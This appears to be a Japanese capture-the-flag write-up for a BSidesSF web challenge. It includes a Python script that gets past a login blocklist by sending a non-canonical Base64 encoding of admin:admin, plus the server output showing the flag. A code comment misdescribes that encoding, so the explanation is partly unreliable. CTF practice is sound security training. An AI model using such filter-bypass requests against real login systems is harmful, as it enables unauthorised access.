# extinction

A Dragon Doomsday weapon has been activated! We've stolen an account (admin:admin), but it's not working!! Can you evade their detection??

index.phpが与えられる

ユーザーが認証情報をBase64エンコードして送信し、その情報が正しいかどうかを確認する仕組みになっています。ただし、特定のBase64エンコードされた文字列（YWRtaW46YWRtaW4）を含んだ場合には、認証が失敗したことを通知されます。この特定の文字列はadmin:adminをBase64エンコードしたもの

## solution

1. フォーム送信のパラメータ: Webページ上でどのパラメータが使われているかを確認します。おそらくencoded_credsというパラメータが使われており、これにBase64エンコードされたusername:passwordペアが渡されます。

2. Base64エンコード: username:passwordペアをBase64でエンコードし、その値を送信します。
3. 結果を確認: サーバーからのレスポンスを確認し、フラグが得られるかどうかを確認します。

solve.py
```
import base64
import requests

def get_url():
    return "https://extinction-63b64602.challenges.bsidessf.net"

encoded_creds = base64.b64encode(b'admin:admin').decode('utf-8')
url = f"{get_url()}/index.php?encoded_creds={encoded_creds}"
response = requests.post(url)

if "CTF" in response.text or "AHA" not in response.text:
    print("Something went wrong: the 'bad' request wasn't correctly handled!")
    exit(1)

# 正しい認証情報を使って再度試す
encoded_creds = "YWRtaW46YWRtaW5="  # これは 'admin:admin' の Base64エンコード結果
url = f"{get_url()}/index.php?encoded_creds={encoded_creds}"
response = requests.post(url)

if response.status_code == 200:
    print("Flag Found:", response.text)
else:
    print(f"Something went wrong: {response.text}")
    exit(1)

print
```


出力にflagが含まれている
```
$ python3 solve.py 
Flag Found: <!DOCTYPE html>
<html lang="en">
<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="dragon-auth-box p-4">
                    <h2 class="text-center mb-4">🐉 Dragon Preservation System 🛡️</h2>

                                            <div class="alert alert-success">Congratulations! Your flag is <tt>CTF{i-saved-the-dragons-and-all-i-got-was-this-stupid-flag}
</tt></div>
                    

        <p>An extinction weapon has been activated against the dragons, and only YOU can stop it!</p>

        <p>Our intelligence reports that the Ally Name is <strong><tt>admin</tt></strong> and the key is <strong><tt>admin</tt></strong>, but that's not working! Can you find a way to use that account??</p>
\
        </script>
                </div>
            </div>
        </div>
    </div>
</body>
</body>
</html>
```